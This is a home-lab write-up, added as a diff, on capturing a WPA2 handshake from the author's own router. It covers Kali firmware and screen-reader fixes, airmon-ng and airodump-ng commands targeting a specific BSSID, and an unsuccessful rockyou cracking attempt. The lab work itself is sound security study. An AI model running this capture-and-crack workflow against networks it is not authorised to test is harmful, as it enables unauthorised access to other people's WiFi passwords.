@@ -1,0 +1,53 @@
+WPA2 Handshake Capture: Home Lab
+
+Overview:
+  Full offensive WiFi workflow. Fresh Kali, Alfa AWUS036AXM, my own GL.iNet GL-MT3000 lab router.
+  Hardware to captured handshake, start to finish.
+
+Hardware:
+  Attack machine: MSI GT72, bare metal Kali
+  Adapter: Alfa AWUS036AXM, WiFi 6E, MT7921AU chipset
+  Target: GL.iNet GL-MT3000, SSID "Home Lab 2G"
+
+What Broke First
+  Fresh Kali did not ship with MT7921AU firmware. Adapter appeared in lsusb but monitor mode failed
+  silently. One package fixed it:
+      sudo apt install firmware-misc-nonfree -y
+
+  Confirmed with dmesg:
+      mt7921u: registered new interface driver
+
+  Second problem was Speakup. Kernel screen reader announcing every character typed at login. Added
+  nospeakup to GRUB_CMDLINE_LINUX_DEFAULT, ran update-grub. Did not fully kill it. Had to remove
+  the packages outright:
+      sudo apt remove espeakup speech-dispatcher -y
+
+  Gone after reboot.
+
+The Attack
+      sudo airmon-ng check kill
+      sudo airmon-ng start wlan1
+
+Verified monitor mode:
+      iwconfig
+
+    wlan1mon confirmed. Scanned, identified target on channel 8, locked on:
+      sudo airodump-ng -c 8 --bssid D6:F2:DD:7E:7F:10 -w /tmp/capture wlan1mon
+
+  Client connected organically during capture. No deauth needed. Handshake appeared in three minutes:
+
+      WPA handshake: D6:F2:DD:7E:7F:10
+
+  Ran rockyou against the cap file. Password was intentionally strong so it did not crack. Expected. The
+  objective was the capture workflow, not a weak password.
+
+Key Takeaways
+  MT7921AU needs firmware that Kali does not include by default. Verify with dmesg before assuming a
+  dead adapter.
+  Handshake capture requires an active client. EAPOL exchange only happens on authentication.
+  Deauth forces it. In this case a client connected naturally.
+  A captured handshake is not access. It is offline cracking material. Password strength is the real
+  defense.
+
+Next
+  AlwaysInstallElevated privesc on the Windows lab target.
